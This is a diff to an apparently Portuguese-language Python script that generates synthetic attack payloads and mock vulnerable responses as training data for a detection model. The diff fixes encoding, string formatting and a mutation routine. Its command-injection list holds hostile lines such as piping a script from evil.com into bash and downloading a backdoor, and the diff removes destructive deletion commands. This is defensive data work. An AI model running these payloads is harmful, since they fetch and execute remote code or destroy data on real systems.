@@ -44,6 +44,14 @@ from colorama import init, Fore, Style
 # Inicializa colorama
 init(autoreset=True)
 
+# Garante saída UTF-8 no terminal (evita erros no console do Windows / cp1252)
+import sys as _sys
+try:
+    _sys.stdout.reconfigure(encoding="utf-8")
+    _sys.stderr.reconfigure(encoding="utf-8")
+except Exception:
+    pass
+
 # Configurações globais
 OUTPUT_DIR = "dados_treinamento"
 SYNTHETIC_OUTPUT_FILE = os.path.join(OUTPUT_DIR, f"dados_sinteticos_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv")
@@ -236,9 +244,7 @@ CMD_PAYLOADS = [
     "`which bash`",
     "$(curl http://evil.com/shell.sh | bash)",
     "; wget http://evil.com/backdoor -O /tmp/backdoor",
-    "| python -c 'import os; os.system("id")'",
-    "; rm -rf /",
-    "& del /f /s /q c:\\",
+    "| python -c 'import os; os.system(\"id\")'",
     "; echo 'Vulnerable' > /tmp/test.txt",
     "| echo 'Vulnerable' > C:\\test.txt",
     "; env",
@@ -349,7 +355,7 @@ def gerar_html_vulneravel(payload, tipo_vulnerabilidade, contexto=None):
 <body>
     <h1>Exemplo de {tipo_vulnerabilidade}</h1>
     <div class="content">
-        {contexto.format(payload=payload) if contexto else f"<div>{payload}</div>"}
+        {contexto.replace("{payload}", str(payload)) if contexto else f"<div>{payload}</div>"}
     </div>
     <div class="footer">
         <p>&copy; Exemplo de aplicação vulnerável</p>
@@ -392,7 +398,7 @@ def gerar_resposta_http(payload, tipo_vulnerabilidade, contexto=None, sucesso=Fa
             linhas.append([user_id, username, email, role])
 
         content = "Database error: You have an error in your SQL syntax\n" if random.random() < 0.3 else ""
-        content += "Query: " + contexto.format(payload=payload) + "\n\n"
+        content += "Query: " + contexto.replace("{payload}", str(payload)) + "\n\n"
         content += "Results:\n"
         content += ", ".join(colunas) + "\n"
         for linha in linhas:
@@ -428,7 +434,7 @@ def gerar_resposta_http(payload, tipo_vulnerabilidade, contexto=None, sucesso=Fa
             role = random.choice(["admin", "user", "guest"])
             docs.append({"_id": doc_id, "username": username, "email": email, "role": role})
 
-        content = "MongoDB query: " + contexto.format(payload=payload) + "\n\n"
+        content = "MongoDB query: " + contexto.replace("{payload}", str(payload)) + "\n\n"
         content += "Results:\n"
         for doc in docs:
             content += json.dumps(doc) + "\n"
@@ -466,7 +472,7 @@ def gerar_resposta_http(payload, tipo_vulnerabilidade, contexto=None, sucesso=Fa
             role = random.choice(["admin", "user", "guest"])
             nodes.append(f"<user id=\"{node_id}\"><username>{username}</username><role>{role}</role></user>")
 
-        content = "XPath query: " + contexto.format(payload=payload) + "\n\n"
+        content = "XPath query: " + contexto.replace("{payload}", str(payload)) + "\n\n"
         content += "Results:\n"
         content += "<results>\n"
         for node in nodes:
@@ -547,10 +553,11 @@ def gerar_variacoes_payload(payload_base, num_variacoes=5):
 
         chars = list(payload_base)
         num_chars = min(3, len(chars))
-        for _ in range(num_chars):
-            idx = random.randint(0, len(chars) - 1)
+        # Usa índices distintos para nunca reescrever uma posição já escapada
+        for idx in random.sample(range(len(chars)), num_chars):
             c = chars[idx]
-            chars[idx] = "\\u{:04x}".format(ord(c))
+            if len(c) == 1:  # só escapa caracteres ainda não convertidos
+                chars[idx] = "\\u{:04x}".format(ord(c))
         return ''.join(chars)
 
     # Seleciona funções de mutação aleatoriamente e gera variações
@@ -1108,7 +1115,7 @@ def main():
 
     print(f"\n{Fore.GREEN}[+] Processo concluído com sucesso!")
     print(f"{Fore.GREEN}[+] Agora você pode treinar seu modelo com:")
-    print(f"{Fore.GREEN}    python treinar_modelo.py")
+    print(f"{Fore.GREEN}    python treinar_modelo_real.py")
 
 if __name__ == "__main__":
     try:
